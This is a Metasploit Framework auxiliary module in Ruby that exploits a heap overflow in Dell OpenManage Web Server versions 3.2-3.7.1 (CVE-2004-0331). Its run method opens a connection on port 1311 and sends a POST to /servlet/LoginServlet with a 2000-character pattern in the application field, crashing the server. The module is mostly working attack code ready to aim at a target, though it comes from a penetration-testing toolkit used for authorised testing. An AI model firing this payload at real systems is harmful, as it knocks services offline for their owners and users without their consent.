##
# $Id: dell_openmanage_post.rb 6847 2009-07-19 20:48:47Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Dell OpenManage POST Request Heap Overflow (win32)',
			'Description'    => %q{
				This module exploits a heap overflow in the Dell OpenManage 
				Web Server (omws32.exe), versions 3.2-3.7.1. The vulnerability
				exists due to a boundary error within the handling of POST requests,
				where the application input is set to an overly long file name.
				This module will crash the web server, however it is likely exploitable
				under certain conditions.
			},
			'Author'         => [ 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 6847 $',
			'References'     =>
				[
					[ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-02/0650.html' ],
					[ 'BID', '9750' ],
					[ 'OSVDB', '4077' ],
					[ 'CVE', '2004-0331' ],
				],
			'DisclosureDate' => 'Feb 26 2004'))
			
		register_options(
			[
				Opt::RPORT(1311),
				OptBool.new('SSL', [true, 'Use SSL', true]),
			],
		self.class)
	end

	def run
		connect

		foo = "user=user&password=password&domain=domain&application=" + Rex::Text.pattern_create(2000)

		sploit = "POST /servlet/LoginServlet?flag=true HTTP/1.0\r\n"
		sploit << "Content-Length: #{foo.length}\r\n\r\n"
		sploit << foo

		sock.put(sploit +"\r\n\r\n")

		disconnect
	end

end